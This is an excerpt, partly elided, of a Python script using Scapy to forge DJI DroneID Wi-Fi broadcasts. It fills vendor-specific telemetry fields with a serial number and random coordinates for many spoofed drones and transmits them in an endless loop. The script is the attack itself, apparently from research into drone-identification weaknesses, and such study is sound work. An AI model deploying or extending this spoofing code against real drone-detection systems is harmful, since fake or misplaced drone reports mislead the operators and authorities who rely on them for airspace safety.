...
#same as max_fields_max_flightLog.py but packets are sent in a list
...
for i in range(n_spoof):
        ...
        lon=location2bytes(random.uniform(-180,180))
        lat=location2bytes(random.uniform(-90, 90))
        # == Information Element: Vendor Specifics (221)
        #telemetry
        dji_payload=b'Xb\x13\x10\x02M\x063\x1f'+SN+lon+lat+b'\xef\xff\x0c\x00\x00\x00\x00\x00\x00\x00\x00C\x00\x00\x00\x00\x99\x01\x00\x00A\xf9|\x00\xcc='
...
sendp(packet_list,iface= iface, loop = 1, inter= 1)
